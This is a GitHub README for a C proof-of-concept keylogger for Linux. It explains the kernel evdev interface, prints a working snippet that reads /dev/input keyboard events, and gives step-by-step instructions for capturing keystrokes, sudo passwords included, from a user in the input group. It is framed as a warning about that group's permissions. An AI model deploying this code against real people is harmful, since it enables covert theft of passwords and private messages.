# keylogger

This is a **systemwide** keylogger for linux, which does not have any advanced capabilities as of now, like sending directly over the internet, but instead,has a basic structure for storing the keys in a file. You can consider it as a PoC - *What implications a user has he/she/it is in the `input` group, or with any group that has read access to the `/dev/input` directory in linux.*

This basically started when a linked in person showcased his keylogger in python - demonstrating it in a **Kali Linux VM**. I suggested that he write it in C. But it was very *itching* for me that I need to write one in C to understand how input events are logged in linux. I have been daily driving linux for almost 3 years and 2 years of *Arch Linux*. I know that there exists a group called `input`, but I was previously assuming that every user should be added to this group so that the user might be able to provide an output

>[!WARNING]
> My assumption was completely wrong when I learnt about the input group and specifically the `/dev/input` directory that is related to it. (from docs.kernel.org).

## Prerequisites

You would need to know how the kernel implements the input events, go directly to the docs.kernel.org, and this [link](https://docs.kernel.org/input/input.html). I have pasted below whatever it is in there, everything you need to understand about the input events. As stated, the **generic input events** are handled by the event dev input interface : `evdev` which directly passes the events generated in the kernel straight into the program, with timestamps. It is an event handler. And event handlers distribute the events from the devices to the userspace and in-kernel consumers as needed. 

### Copy Pasta of the mandatory content :

#### 1.1. Introduction

Input subsystem is a collection of drivers that is designed to support all input devices under Linux. Most of the drivers reside in drivers/input, although quite a few live in drivers/hid and drivers/platform. The core of the input subsystem is the input module, which must be loaded before any other of the input modules - it serves as a way of communication between two groups of modules:

1.1.1. Device drivers : These modules talk to the hardware (for example via USB), and provide events (keystrokes, mouse movements) to the input module.
1.1.2. Event handlers : These modules get events from input core and pass them where needed via various interfaces - keystrokes to the kernel, mouse movements via a simulated PS/2 interface to GPM and X, and so on.

#### 1.2. Simple Usage

For the most usual configuration, with one USB mouse and one USB keyboard, you’ll have to load the following modules (or have them built in to the kernel):

```txt
input
mousedev
usbcore
uhci_hcd or ohci_hcd or ehci_hcd
usbhid
hid_generic
```

After this, the USB keyboard will work straight away, and the USB mouse will be available as a character device: 

```txt
crw-r--r--   1 root     root      13,  63 Mar 28 22:45 mice
```

This device is usually created automatically by the system. The commands to create it by hand are:

```bash
cd /dev
mkdir input
mknod input/mice c 13 63
```

>[!NOTE]
> This is same as `mkdir -p /dev/input && mknod /dev/input/mice c 13 63`

After that you have to point GPM (the textmode mouse cut&paste tool) and XFree to this device to use it - GPM should be called like:
```bash

gpm -t ps2 -m /dev/input/mice
```

And in X:

```txt

Section "Pointer"
    Protocol    "ImPS/2"
    Device      "/dev/input/mice"
    ZAxisMapping 4 5
EndSection
```

When you do all of the above, you can use your USB mouse and keyboard.

#### 1.3. Detailed Description

1.3.1. Event handlers : Event handlers distribute the events from the devices to userspace and in-kernel consumers, as needed.

1.3.1.1. evdev : evdev is the generic input event interface. It passes the events generated in the kernel straight to the program, with timestamps. The event codes are the same on all architectures and are hardware independent. This is the preferred interface for userspace to consume user input, and all clients are encouraged to use it.

The devices are in /dev/input:

```bash
crw-r--r--   1 root     root      13,  64 Apr  1 10:49 event0
crw-r--r--   1 root     root      13,  65 Apr  1 10:50 event1
crw-r--r--   1 root     root      13,  66 Apr  1 10:50 event2
crw-r--r--   1 root     root      13,  67 Apr  1 10:50 event3
...

```

There are two ranges of minors: 64 through 95 is the static legacy range. If there are more than 32 input devices in a system, additional evdev nodes are created with minors starting with 256.

1.3.1.2. keyboard : keyboard is in-kernel input handler and is a part of VT code. It consumes keyboard keystrokes and handles user input for VT consoles.
1.3.1.3. mousedev : mousedev is a hack to make legacy programs that use mouse input work. It takes events from either mice or digitizers/tablets and makes a PS/2-style (a la /dev/psaux) mouse device available to the userland.

Mousedev devices in /dev/input (as shown above) are:

```bash
crw-r--r--   1 root     root      13,  32 Mar 28 22:45 mouse0
crw-r--r--   1 root     root      13,  33 Mar 29 00:41 mouse1
crw-r--r--   1 root     root      13,  34 Mar 29 00:41 mouse2
crw-r--r--   1 root     root      13,  35 Apr  1 10:50 mouse3
...
...
crw-r--r--   1 root     root      13,  62 Apr  1 10:50 mouse30
crw-r--r--   1 root     root      13,  63 Apr  1 10:50 mice
```


Each mouse device is assigned to a single mouse or digitizer, except the last one - mice. This single character device is shared by all mice and digitizers, and even if none are connected, the device is present. This is useful for hotplugging USB mice, so that older programs that do not handle hotplug can open the device even when no mice are present.

CONFIG_INPUT_MOUSEDEV_SCREEN_[XY] in the kernel configuration are the size of your screen (in pixels) in XFree86. This is needed if you want to use your digitizer in X, because its movement is sent to X via a virtual PS/2 mouse and thus needs to be scaled accordingly. These values won’t be used if you use a mouse only.

Mousedev will generate either PS/2, ImPS/2 (Microsoft IntelliMouse) or ExplorerPS/2 (IntelliMouse Explorer) protocols, depending on what the program reading the data wishes. You can set GPM and X to any of these. You’ll need ImPS/2 if you want to make use of a wheel on a USB mouse and ExplorerPS/2 if you want to use extra (up to 5) buttons.

1.3.2.1. hid-generic : hid-generic is one of the largest and most complex driver of the whole suite. It handles all HID devices, and because there is a very wide variety of them, and because the USB HID specification isn’t simple, it needs to be this big. Currently, it handles USB mice, joysticks, gamepads, steering wheels, keyboards, trackballs and digitizers. However, USB uses HID also for monitor controls, speaker controls, UPSs, LCDs and many other purposes.

The monitor and speaker controls should be easy to add to the hid/input interface, but for the UPSs and LCDs it doesn’t make much sense. For this, the hiddev interface was designed. See Care and feeding of your Human Interface Devices for more information about it.

The usage of the usbhid module is very simple, it takes no parameters, detects everything automatically and when a HID device is inserted, it detects it appropriately.

However, because the devices vary wildly, you might happen to have a device that doesn’t work well. In that case #define DEBUG at the beginning of hid-core.c and send me the syslog traces.

>[!IMPORTANT]
> Some parts from the documentation are skipped, only what is minimum necessary to understand is given.

#### 1.5. Event interface

You can use blocking and nonblocking reads, and also select() on the `/dev/input/eventX` devices, and you’ll always get a whole number of input events on a read. Their layout is:

This is the most important struct we have in our program : this is the data. That's it.

```c
struct input_event {
        struct timeval time;
        unsigned short type;
        unsigned short code;
        int value;
};
```


`time`` is the timestamp, it returns the time at which the event happened. Type is for example EV_REL for relative movement, EV_KEY for a keypress or release. More types are defined in `include/uapi/linux/input-event-codes.h`. 

`code` is event code, for example REL_X or KEY_BACKSPACE, again a complete list is in include/uapi/linux/input-event-codes.h.

`value` is the value the event carries. Either a relative change for EV_REL, absolute new value for EV_ABS (joysticks ...), or 0 for EV_KEY for release, 1 for keypress and 2 for autorepeat.

## Basic Codes

To understand the basic parts of the `linux/input-event-codes.h` and `linux/input.h`, you can see the files in [basics](./basics/) directory. 

The most basic keylogger is the one that flushes the raw input event codes directly to the `stdout` as provided in here : [./basics/input-event-codes.c]

```c
#include <linux/input-event-codes.h>
#include <linux/input.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdio.h>


int main() {
    int fd = open("/dev/input/event3", O_RDONLY);
    if (fd < 0) { perror("open"); return 1; }

    struct input_event ev;
    while (read(fd, &ev, sizeof(ev)) == sizeof(ev)) {
        if (ev.type == EV_KEY && ev.value == 1) { // 1 = key down only
            fprintf(stdout, "[code:%d]", ev.code);
            fflush(stdout);
        }
    }
    close(fd);
    return 0;
}
```

The `linux/*` headers included are for the parsing of the input event codes. `fcntl` for file control, `unistd` for unix standard sycalls `open`, `read`, `close` and `stdio.h` for standard input output functions. That's it, a basic `man 3 <function>` should help you understand the syscalls and the function declarations.

## Executing the main code

The main code is the `logger.c`, which will log the keypresses to `~/.logarity.txt`. And appends the keys logged via `fprintf` and `fflush` to immediately flush to the file instead of waiting for `fclose`. 

But we need to make sure that the user is in the `input` group. To check that, you can use the `groups` command. 

```bash
groups $USER
```

If `input` is listed in the output - **you are vulnerable** - Kindly find why your user is in the `input` group and remove it after reading the arch manual pages. (I am not going to help with that).

If not, then you need to create a victim user to carry out this keylogger. Normally, keyloggers written in **python** which utilises the `pynput` python library will not be able to log the `sudo` or admin right processes. Also - wayland will not allow one app to capture the events in another app - isolation and security. 

But... If a user is in the `input` group, you don't even have to be a `sudo` or `root` user in order to be exploitable. Just a normal user - even your sudo passwords will be logged. 

>[!WARNING]
> This is a demonstration of only the **keylogger** : which logs your keys. But `/dev/input` is not only keyboard input event directory, it is a directory which consists of all inputs to your system - `mouse`, `keyboard`, `laptop lid (close/open)`, `joystick`, `or whatever` input device. 
>
> As a result, it is sufficiently easy for a person to escalate this keylogger C program into a systemwide EVENTLOGGER capable of logging all the input events including the mouse coordinates, (with which he or she may be able to detect your screen dimensions, stimulate clicks and keypresses), and remotely flush it live to a random server, or save it in a file and periodically push it to a remote server; you are purged.

As a result, the Arch Users Forum as well as AI slopped Gemini Recommendation from the google search does not recommend the user to be added to the `input` group. 

### Compile the binary

```bash
gcc logger.c -o logger
```

### Create the Victm user

To create a victim user who is in the `wheel` and `input` group, do the following :

```bash
sudo useradd -m -s /bin/fish -G input,wheel victim
```

This will create a home directory for a user named `victim` who uses default shell `/bin/fish` and is in the groups `input` and `wheel`.

To check the user is actually created and is in the input group:

```bash
groups victim
```

You should get some output like this :

```txt
victim : victim wheel input
```

Then create a password for your victim user by :

```bash
sudo passwd victim
```

Enter your sudo password for the current user;
Enter your new password for the victim; Confirm the new password and remember this password; Later when we switch the user to victim, you would need to enter this password.

If you get `password updated successfully`, then your are good to go.

### Switch to the `victim` user.

Use the `su` command to switch to the victim as :

```bash
su victim
# When prompted for the password, enter the victim's password.
```

### Execute the `logger`

```bash
./logger /dev/input/by-id/usb-3554_2.4G_Receiver-event-kbd
```

>[!NOTE]
> The input path for you may differ based on the keyboard. Make use the provide a valid keyboard input event path (must contain a `kbd`) in its name. Like `usb....event-kbd`

Open a new terminal, type some commands, try sudo passwords, enter another application, try a websearch, login to your google account, send your friend a friendly message along with the link to this github repo. Come back to the terminal where you ran the `logger` command - everything should be logged live @ stdout.

>[NOTE]
> If it did not log, kindly open an issue so that I can address what is missing in there. Make sure to paste the exact command you ran and also the output of `ls /dev/input/by-id` directory.

Here we are not logging the keypresses. In order to log the keypress, you can pass the `--log` or `-l` flag at the end of the command.

The logged file will be in the home directory as `~/.logarity.txt`.

This is the end of the key logger PoC as you can see how easy it is for a person to log your keypresses.

### Don't become a victim.

Now that we need to delete the `victim` user, else you might really become a victim :)...

```bash
# exit the victim user
exit
# you will be dropped into your previous user.
sudo userdel victim
# you will be prompted to enter your sudo password.
sudo rm -rf /home/victim
# remove the home directory of your victim.
```

You are good to go; The PoC ends here.


>[!IMPORTANT]
> If ever any script prompts your user to be added to the `input` group, there is a potential possibility that the program/script might be an advanced SYSTEMWIDE EVENTLOGGER (As I said previously, it is possible for us to just read the relevant /dev/input/event* files and create a systemwide logger). Be careful!!!

If you like this project or learnt anything new from it, kindly put a star to this repo. If you want to add some keylogging feature to this PoC script, very well welcome, open a Pull Request.


### This works only in linux;;;
